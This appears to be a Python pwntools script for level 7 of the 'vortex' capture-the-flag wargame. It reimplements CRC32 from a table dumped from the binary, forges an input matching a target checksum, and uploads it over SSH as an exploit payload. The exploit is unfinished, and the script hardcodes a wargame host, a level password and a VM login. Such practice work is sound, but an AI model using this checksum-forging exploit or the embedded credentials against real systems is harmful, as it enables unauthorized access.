from pwn import *
import crc
import zlib


# def byte_xor(ba1, ba2):
#     # payload_len = len(ba1)
#     # key_multiple = (int)(payload_len / 128)
#     # key_multiple = key_multiple + 128
#     # key = ba2*key_multiple
#     return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

CONSTANT_START_VAL = 268435456

# crcTable = list()
# for i in range(256):
#     crcTable.append(CONSTANT_START_VAL + i)

# extracted from binary
'''
(gdb) x/256wx 0x8048600
0x8048600 <crc32_table>:        0x00000000      0x77073096      0xee0e612c      0x990951ba
0x8048610 <crc32_table+16>:     0x076dc419      0x706af48f      0xe963a535      0x9e6495a3
0x8048620 <crc32_table+32>:     0x0edb8832      0x79dcb8a4      0xe0d5e91e      0x97d2d988
0x8048630 <crc32_table+48>:     0x09b64c2b      0x7eb17cbd      0xe7b82d07      0x90bf1d91
0x8048640 <crc32_table+64>:     0x1db71064      0x6ab020f2      0xf3b97148      0x84be41de
0x8048650 <crc32_table+80>:     0x1adad47d      0x6ddde4eb      0xf4d4b551      0x83d385c7
0x8048660 <crc32_table+96>:     0x136c9856      0x646ba8c0      0xfd62f97a      0x8a65c9ec
0x8048670 <crc32_table+112>:    0x14015c4f      0x63066cd9      0xfa0f3d63      0x8d080df5
0x8048680 <crc32_table+128>:    0x3b6e20c8      0x4c69105e      0xd56041e4      0xa2677172
0x8048690 <crc32_table+144>:    0x3c03e4d1      0x4b04d447      0xd20d85fd      0xa50ab56b
0x80486a0 <crc32_table+160>:    0x35b5a8fa      0x42b2986c      0xdbbbc9d6      0xacbcf940
0x80486b0 <crc32_table+176>:    0x32d86ce3      0x45df5c75      0xdcd60dcf      0xabd13d59
0x80486c0 <crc32_table+192>:    0x26d930ac      0x51de003a      0xc8d75180      0xbfd06116
0x80486d0 <crc32_table+208>:    0x21b4f4b5      0x56b3c423      0xcfba9599      0xb8bda50f
0x80486e0 <crc32_table+224>:    0x2802b89e      0x5f058808      0xc60cd9b2      0xb10be924
0x80486f0 <crc32_table+240>:    0x2f6f7c87      0x58684c11      0xc1611dab      0xb6662d3d
0x8048700 <crc32_table+256>:    0x76dc4190      0x01db7106      0x98d220bc      0xefd5102a
0x8048710 <crc32_table+272>:    0x71b18589      0x06b6b51f      0x9fbfe4a5      0xe8b8d433
0x8048720 <crc32_table+288>:    0x7807c9a2      0x0f00f934      0x9609a88e      0xe10e9818
0x8048730 <crc32_table+304>:    0x7f6a0dbb      0x086d3d2d      0x91646c97      0xe6635c01
0x8048740 <crc32_table+320>:    0x6b6b51f4      0x1c6c6162      0x856530d8      0xf262004e
0x8048750 <crc32_table+336>:    0x6c0695ed      0x1b01a57b      0x8208f4c1      0xf50fc457
0x8048760 <crc32_table+352>:    0x65b0d9c6      0x12b7e950      0x8bbeb8ea      0xfcb9887c
0x8048770 <crc32_table+368>:    0x62dd1ddf      0x15da2d49      0x8cd37cf3      0xfbd44c65
0x8048780 <crc32_table+384>:    0x4db26158      0x3ab551ce      0xa3bc0074      0xd4bb30e2
0x8048790 <crc32_table+400>:    0x4adfa541      0x3dd895d7      0xa4d1c46d      0xd3d6f4fb
0x80487a0 <crc32_table+416>:    0x4369e96a      0x346ed9fc      0xad678846      0xda60b8d0
0x80487b0 <crc32_table+432>:    0x44042d73      0x33031de5      0xaa0a4c5f      0xdd0d7cc9
0x80487c0 <crc32_table+448>:    0x5005713c      0x270241aa      0xbe0b1010      0xc90c2086
0x80487d0 <crc32_table+464>:    0x5768b525      0x206f85b3      0xb966d409      0xce61e49f
0x80487e0 <crc32_table+480>:    0x5edef90e      0x29d9c998      0xb0d09822      0xc7d7a8b4
0x80487f0 <crc32_table+496>:    0x59b33d17      0x2eb40d81      0xb7bd5c3b      0xc0ba6cad
0x8048800 <crc32_table+512>:    0xedb88320      0x9abfb3b6      0x03b6e20c      0x74b1d29a
0x8048810 <crc32_table+528>:    0xead54739      0x9dd277af      0x04db2615      0x73dc1683
0x8048820 <crc32_table+544>:    0xe3630b12      0x94643b84      0x0d6d6a3e      0x7a6a5aa8
0x8048830 <crc32_table+560>:    0xe40ecf0b      0x9309ff9d      0x0a00ae27      0x7d079eb1
0x8048840 <crc32_table+576>:    0xf00f9344      0x8708a3d2      0x1e01f268      0x6906c2fe
0x8048850 <crc32_table+592>:    0xf762575d      0x806567cb      0x196c3671      0x6e6b06e7
0x8048860 <crc32_table+608>:    0xfed41b76      0x89d32be0      0x10da7a5a      0x67dd4acc
0x8048870 <crc32_table+624>:    0xf9b9df6f      0x8ebeeff9      0x17b7be43      0x60b08ed5
0x8048880 <crc32_table+640>:    0xd6d6a3e8      0xa1d1937e      0x38d8c2c4      0x4fdff252
0x8048890 <crc32_table+656>:    0xd1bb67f1      0xa6bc5767      0x3fb506dd      0x48b2364b
0x80488a0 <crc32_table+672>:    0xd80d2bda      0xaf0a1b4c      0x36034af6      0x41047a60
0x80488b0 <crc32_table+688>:    0xdf60efc3      0xa867df55      0x316e8eef      0x4669be79
0x80488c0 <crc32_table+704>:    0xcb61b38c      0xbc66831a      0x256fd2a0      0x5268e236
0x80488d0 <crc32_table+720>:    0xcc0c7795      0xbb0b4703      0x220216b9      0x5505262f
0x80488e0 <crc32_table+736>:    0xc5ba3bbe      0xb2bd0b28      0x2bb45a92      0x5cb36a04
0x80488f0 <crc32_table+752>:    0xc2d7ffa7      0xb5d0cf31      0x2cd99e8b      0x5bdeae1d
0x8048900 <crc32_table+768>:    0x9b64c2b0      0xec63f226      0x756aa39c      0x026d930a
0x8048910 <crc32_table+784>:    0x9c0906a9      0xeb0e363f      0x72076785      0x05005713
0x8048920 <crc32_table+800>:    0x95bf4a82      0xe2b87a14      0x7bb12bae      0x0cb61b38
0x8048930 <crc32_table+816>:    0x92d28e9b      0xe5d5be0d      0x7cdcefb7      0x0bdbdf21
0x8048940 <crc32_table+832>:    0x86d3d2d4      0xf1d4e242      0x68ddb3f8      0x1fda836e
0x8048950 <crc32_table+848>:    0x81be16cd      0xf6b9265b      0x6fb077e1      0x18b74777
0x8048960 <crc32_table+864>:    0x88085ae6      0xff0f6a70      0x66063bca      0x11010b5c
0x8048970 <crc32_table+880>:    0x8f659eff      0xf862ae69      0x616bffd3      0x166ccf45
0x8048980 <crc32_table+896>:    0xa00ae278      0xd70dd2ee      0x4e048354      0x3903b3c2
0x8048990 <crc32_table+912>:    0xa7672661      0xd06016f7      0x4969474d      0x3e6e77db
0x80489a0 <crc32_table+928>:    0xaed16a4a      0xd9d65adc      0x40df0b66      0x37d83bf0
0x80489b0 <crc32_table+944>:    0xa9bcae53      0xdebb9ec5      0x47b2cf7f      0x30b5ffe9
0x80489c0 <crc32_table+960>:    0xbdbdf21c      0xcabac28a      0x53b39330      0x24b4a3a6
0x80489d0 <crc32_table+976>:    0xbad03605      0xcdd70693      0x54de5729      0x23d967bf
0x80489e0 <crc32_table+992>:    0xb3667a2e      0xc4614ab8      0x5d681b02      0x2a6f2b94
0x80489f0 <crc32_table+1008>:   0xb40bbe37      0xc30c8ea1      0x5a05df1b      0x2d02ef8d

'''

gdb_extracted_table_s = "0x00000000 0x77073096 0xee0e612c 0x990951ba 0x076dc419 0x706af48f 0xe963a535 0x9e6495a3 0x0edb8832 0x79dcb8a4 0xe0d5e91e 0x97d2d988 0x09b64c2b 0x7eb17cbd 0xe7b82d07 0x90bf1d91 0x1db71064 0x6ab020f2 0xf3b97148 0x84be41de 0x1adad47d 0x6ddde4eb 0xf4d4b551 0x83d385c7 0x136c9856 0x646ba8c0 0xfd62f97a 0x8a65c9ec 0x14015c4f 0x63066cd9 0xfa0f3d63 0x8d080df5 0x3b6e20c8 0x4c69105e 0xd56041e4 0xa2677172 0x3c03e4d1 0x4b04d447 0xd20d85fd 0xa50ab56b 0x35b5a8fa 0x42b2986c 0xdbbbc9d6 0xacbcf940 0x32d86ce3 0x45df5c75 0xdcd60dcf 0xabd13d59 0x26d930ac 0x51de003a 0xc8d75180 0xbfd06116 0x21b4f4b5 0x56b3c423 0xcfba9599 0xb8bda50f 0x2802b89e 0x5f058808 0xc60cd9b2 0xb10be924 0x2f6f7c87 0x58684c11 0xc1611dab 0xb6662d3d 0x76dc4190 0x01db7106 0x98d220bc 0xefd5102a 0x71b18589 0x06b6b51f 0x9fbfe4a5 0xe8b8d433 0x7807c9a2 0x0f00f934 0x9609a88e 0xe10e9818 0x7f6a0dbb 0x086d3d2d 0x91646c97 0xe6635c01 0x6b6b51f4 0x1c6c6162 0x856530d8 0xf262004e 0x6c0695ed 0x1b01a57b 0x8208f4c1 0xf50fc457 0x65b0d9c6 0x12b7e950 0x8bbeb8ea 0xfcb9887c 0x62dd1ddf 0x15da2d49 0x8cd37cf3 0xfbd44c65 0x4db26158 0x3ab551ce 0xa3bc0074 0xd4bb30e2 0x4adfa541 0x3dd895d7 0xa4d1c46d 0xd3d6f4fb 0x4369e96a 0x346ed9fc 0xad678846 0xda60b8d0 0x44042d73 0x33031de5 0xaa0a4c5f 0xdd0d7cc9 0x5005713c 0x270241aa 0xbe0b1010 0xc90c2086 0x5768b525 0x206f85b3 0xb966d409 0xce61e49f 0x5edef90e 0x29d9c998 0xb0d09822 0xc7d7a8b4 0x59b33d17 0x2eb40d81 0xb7bd5c3b 0xc0ba6cad 0xedb88320 0x9abfb3b6 0x03b6e20c 0x74b1d29a 0xead54739 0x9dd277af 0x04db2615 0x73dc1683 0xe3630b12 0x94643b84 0x0d6d6a3e 0x7a6a5aa8 0xe40ecf0b 0x9309ff9d 0x0a00ae27 0x7d079eb1 0xf00f9344 0x8708a3d2 0x1e01f268 0x6906c2fe 0xf762575d 0x806567cb 0x196c3671 0x6e6b06e7 0xfed41b76 0x89d32be0 0x10da7a5a 0x67dd4acc 0xf9b9df6f 0x8ebeeff9 0x17b7be43 0x60b08ed5 0xd6d6a3e8 0xa1d1937e 0x38d8c2c4 0x4fdff252 0xd1bb67f1 0xa6bc5767 0x3fb506dd 0x48b2364b 0xd80d2bda 0xaf0a1b4c 0x36034af6 0x41047a60 0xdf60efc3 0xa867df55 0x316e8eef 0x4669be79 0xcb61b38c 0xbc66831a 0x256fd2a0 0x5268e236 0xcc0c7795 0xbb0b4703 0x220216b9 0x5505262f 0xc5ba3bbe 0xb2bd0b28 0x2bb45a92 0x5cb36a04 0xc2d7ffa7 0xb5d0cf31 0x2cd99e8b 0x5bdeae1d 0x9b64c2b0 0xec63f226 0x756aa39c 0x026d930a 0x9c0906a9 0xeb0e363f 0x72076785 0x05005713 0x95bf4a82 0xe2b87a14 0x7bb12bae 0x0cb61b38 0x92d28e9b 0xe5d5be0d 0x7cdcefb7 0x0bdbdf21 0x86d3d2d4 0xf1d4e242 0x68ddb3f8 0x1fda836e 0x81be16cd 0xf6b9265b 0x6fb077e1 0x18b74777 0x88085ae6 0xff0f6a70 0x66063bca 0x11010b5c 0x8f659eff 0xf862ae69 0x616bffd3 0x166ccf45 0xa00ae278 0xd70dd2ee 0x4e048354 0x3903b3c2 0xa7672661 0xd06016f7 0x4969474d 0x3e6e77db 0xaed16a4a 0xd9d65adc 0x40df0b66 0x37d83bf0 0xa9bcae53 0xdebb9ec5 0x47b2cf7f 0x30b5ffe9 0xbdbdf21c 0xcabac28a 0x53b39330 0x24b4a3a6 0xbad03605 0xcdd70693 0x54de5729 0x23d967bf 0xb3667a2e 0xc4614ab8 0x5d681b02 0x2a6f2b94 0xb40bbe37 0xc30c8ea1 0x5a05df1b 0x2d02ef8d"
crcTable = [0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7, 0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59, 0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924, 0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433, 0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65, 0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f, 0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1, 0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b, 0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236, 0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d, 0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777, 0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9, 0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d]

local_dir = None
remote_binary = None
local_binary = None
local_libc = None
libc = None
port = None
elf = None

BINARY_PATH = None
CWD = None
VM = None


def connect(level, password):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global CWD
    global BINARY_PATH
    global VM
    compose_downloaded_files(level)
    port = 2228
    s = ssh("vortex"+level, "176.9.9.172", password=password, cache=True, port=port)
    s.libs(remote_binary, local_dir)
    log.info(f"cloned_binary: {local_binary}")
    elf = ELF(local_binary)
    libc = ELF(local_libc)
    VM = False
    CWD = "/tmp/"
    BINARY_PATH = "/vortex/vortex"+level
    return s


# function of local testing vm
def connect_to_vm(level, password, remote=True):
    global CWD
    global VM
    global BINARY_PATH
    global ALIGNMENT_OFF
    if remote:
        connect(level, password)
    else:
        compose_downloaded_files(level)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"
    s = ssh("gil", "192.168.2.177", password="gil123", cache=True)
    CWD = "/vortex/6/"
    BINARY_PATH = "/vortex/vortex" + level
    # BINARY_PATH = "/vortex/6/dir/vortex6"
    # BINARY_PATH = "dir/vortex6"
    s.upload(local_binary, BINARY_PATH)
    s.process(["chmod", "a+x", BINARY_PATH])
    VM = True
    return s
    # only useful to replace libc, if we need gadgets from it, then upload and use LD_PRELOAD
    # s.upload(local_libc, "/lib/x86_64-linux-gnu/libc.so.6")


def compose_downloaded_files(level):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global local_libc
    local_dir = "/home/kali/PycharmProjects/vortex/" + level
    remote_binary = "/vortex/vortex" + level
    local_binary = local_dir + remote_binary
    local_libc = local_dir + "/lib32/libc.so.6"


input = b"AqxvBT"

def crc32(input, table):
    # xor with all ones = bit flip
    # https://en.wikipedia.org/wiki/Cyclic_redundancy_check
    crc32 = 0xffffffff
    for char in input:
        log.info(f"starting iteration with crc: {bin(crc32)}")
        log.info(f"char: {char}")
        log.info(f"char: {bin(char)}")
        pre_index = crc32 ^ char
        # pre_index = byte_xor(bytes(crc32), char)
        # log.info(f"pre_index: {pre_index}")
        log.info(f"pre_index: {bin(pre_index)}")
        index = pre_index & 0xff
        log.info(f"index: {bin(index)}")
        log.info(f"index: {index}")
        shifted_crc32 = crc32 >> 8
        # log.info(f"shifted_crc32: {shifted_crc32}")
        log.info(f"shifted_crc32: {bin(shifted_crc32)}")
        constant = table[index]
        log.info(f"constant: {constant}")
        log.info(f"constant: {bin(constant)}")
        # bit flip
        crc32 = shifted_crc32 ^ constant
        log.info(f"merged_crc (merged with constant): {bin(crc32)}")
        log.info("###################################################")

    result_crc32 = crc32 ^ 0xffffffff
    return result_crc32

log.info("############################################################################################################################################################")
log.info("# CHECK IF OUR CRC32 IMPL IS CORRECT")
log.info("############################################################################################################################################################")

# checksum = crc32(input, table=crcTable)
#
# log.info("---- our impl")
# log.info(f"final checksum: {checksum}")
# log.info(f"final checksum: {bin(checksum)}")
# log.info(hex(checksum))
#
# checksum = binascii.crc32(input) & 0xffffffff
#
# log.info("---- lib impl")
# log.info(f"final checksum: {checksum}")
# log.info(f"final checksum: {bin(checksum)}")
# log.info(hex(checksum))



# def gen_crc_table():
#     table = list()
#     raw_table = read("./7/table").decode("utf-8")
#     lines = raw_table.split("\n")
#     curr_byte = ""
#     for i in range(len(lines)):
#         line = lines[i]
#         # log.info(f"line: {line}")
#         elements = line.split(" ")
#         byte = elements[12]
#         curr_byte += byte[::-1]
#         log.info(f"curr_byte: {curr_byte}")
#         if i % 4 == 3:
#             table.append(int("0x" + curr_byte[::-1], 16))
#             curr_byte = ""
#
#     return table

def gen_crc_table():
    table = list()
    values = gdb_extracted_table_s.split(" ")
    for v in values:
        table.append(int(v, 16))
    return table

table = gen_crc_table()

log.info("############################################################################################################################################################")
log.info("# LOGGING TABLE")
log.info("############################################################################################################################################################")
log.info(f"table: {table}")
for val in table:
    log.info("val: " + hex(val))

# generated table is written into python script from github
# python3 ./7/crc32/crc32-tablemod.py reverse 0xe1ca95ee
# -> pick one of the results

log.info("############################################################################################################################################################")
log.info("# TEST IF REVERSED RESULT INPUT GENERATES EXPECTED CHECKSUM")
log.info("############################################################################################################################################################")

crc_input = b"wVfRTx"
checksum = crc32(crc_input, table=table)

log.info("----")
log.info(f"final checksum: {checksum}")
log.info(f"final checksum: {bin(checksum)}")
log.info(hex(checksum))
log.info("expected: 0xe1ca95ee")

log.info("############################################################################################################################################################")
log.info("# COMPARE TABLES")
log.info("############################################################################################################################################################")

diff = []
for i in range(len(crcTable)):
    if crcTable[i] != table[i]:
        log.info(f"diff at index:{i}")
        diff.append(table[i])

assert len(diff) == 0
log.info("tables from binary and ref impl are the same")

log.info("############################################################################################################################################################")
log.info("# CREATING REVERSED INPUT")
log.info("############################################################################################################################################################")

def bin_crc32(input):
    # xor with all ones = bit flip
    # https://en.wikipedia.org/wiki/Cyclic_redundancy_check
    crc32 = 0
    for char in input:
        # log.info(f"starting iteration with crc: {bin(crc32)}")
        # log.info(f"char: {char}")
        # log.info(f"char: {bin(char)}")
        byte_ord_num = char
        byte_ord_num = byte_ord_num & 0xff
        byte_ord_num = crc32 ^ byte_ord_num
        byte_ord_num = byte_ord_num & 0xff
        index = byte_ord_num
        # log.info(f"index: {index}")
        constant = table[index]
        # log.info(f"constant: {constant}")
        crc32 = crc32 >> 8
        crc32 = crc32 ^ constant
        # log.info(f"crc32 for this iteration: {crc32}")
        # log.info("###################################################")
    return crc32


checksum = bin_crc32(crc_input)
log.info("checksum: " + hex(checksum))


log.info("############################################################################################################################################################")
log.info("# EXECUTE EXPLOIT")
log.info("############################################################################################################################################################")

# connect("7", "Y52jxHtt/")
s = connect_to_vm("7", "Y52jxHtt/", remote=False)

payload = b""
payload += crc_input
# payload += b"\x00"
# payload += bytes(string.ascii_uppercase*4, "utf-8")

write("/tmp/docgil", payload)
s.upload("/tmp/docgil", "/tmp/docgil")
# payload += asm(pwnlib.shellcraft.i386.nop()) * 10
# payload +=


